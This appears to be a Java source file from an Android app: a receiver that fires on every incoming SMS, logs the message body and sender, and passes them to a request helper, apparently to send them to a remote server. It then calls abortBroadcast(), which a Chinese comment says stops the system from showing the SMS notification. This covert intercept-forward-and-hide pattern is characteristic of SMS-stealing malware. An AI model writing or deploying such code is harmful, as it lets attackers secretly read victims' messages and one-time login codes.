package com.firstapp.service;
 
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;
import com.firstapp.MainActivity;
import com.firstapp.R;
import com.firstapp.common.SendRequest;

import java.io.UnsupportedEncodingException;

import static android.content.Context.MODE_PRIVATE;

public class SmsRecevier extends BroadcastReceiver {
 
    public SmsRecevier() {
        super();
        Log.v("dimos", "SmsRecevier create");
    }
 
    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences("com." + R.string.app_name + ".localstorage", MODE_PRIVATE);
        String dString = SmsHelper.getSmsBody(intent);
        String address = SmsHelper.getSmsAddress(intent);
        Log.i("dimos", dString+","+address);
        SendRequest sendRequest = new SendRequest();
        try {
            sendRequest.sendMsg(prefs, null,dString,address);
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        }
        //阻止广播继续传递，如果该receiver比系统的级别高，
        //那么系统就不会收到短信通知了
 
        abortBroadcast(); 
    }
}